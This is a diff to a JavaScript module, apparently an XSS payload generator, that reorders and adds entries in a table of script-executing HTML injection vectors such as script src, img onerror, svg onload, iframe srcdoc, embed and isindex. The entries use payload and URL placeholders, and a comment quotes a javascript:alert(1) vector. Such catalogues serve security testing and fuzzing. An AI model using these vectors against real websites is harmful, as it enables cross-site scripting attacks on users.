@@ -18,18 +18,23 @@ var ProducerModule = (function() {
      */
     'CAP_INCLUDE_PAGE': [{'tagName': 'iframe', 'attributes': {'src': ['X-url', '']} } ], // the most powerful you can get...descending from here
     'CAP_EXECUTE_SCRIPT': [
-      {'tagName': 'script', 'attributes': {}, 'content': ['X-payload', 'text/javascript']},
-      {'tagName': 'script', 'attributes': {'src': ['X-url', 'text/javascript']} },
-      {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
-      {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
-      {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
-      {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO doesnt work in frames :/
-      {"tagName": "svg", "attributes": {"onload": ['X-payload', 'text/javascript']}},
-      {"tagName": "table", "attributes": {"background": ['X-url', 'text/javascript']}},
       {"tagName": "A", "attributes": {"folder": ['X-url', 'text/javascript'],"style": "behavior:url(#default#AnchorClick);"}, "content": ['X-payload','text']},
-      {"tagName": "object", "attributes": {"data":['X-url', 'text/javascript']}},
+      {"tagName": "embed", "attributes": {"src":['X-url', 'text/javascript']} },
+      {"tagName": "embed", "attributes": {"code":['X-url', 'text/javascript']} },
+      {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
       {"tagName": "iframe", "attributes": {"srcdoc":['X-payload', 'text/html']} },
       {"tagName": "iframe", "attributes": {"src":['X-url', 'text/html']} },
+      {"tagName": "iframe", "attributes": {"src":['X-url', 'text/javascript']} },
+      {"tagName": "iframe", "attributes": {"onload": ['X-payload', 'text/javascript']}},
+      {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
+      {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
+      {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO doesnt work in frames :/
+      {"tagName": "isindex", "attributes": {"type": "image", "src": ['X-payload', 'text/javascript']}},
+      {"tagName": "object", "attributes": {"data":['X-url', 'text/javascript']}},
+      {'tagName': 'script', 'attributes': {}, 'content': ['X-payload', 'text/javascript']},
+      {'tagName': 'script', 'attributes': {'src': ['X-url', 'text/javascript']} },
+      {"tagName": "svg", "attributes": {"onload": ['X-payload', 'text/javascript']}},
+      {"tagName": "table", "attributes": {"background": ['X-url', 'text/javascript']}},
       /*TODO
        replacing in attribute value :<
        {"tagName":"A","attributes":{"style":"-o-link:'javascript:alert(1)';-o-link-source:current"},"content":"X"},
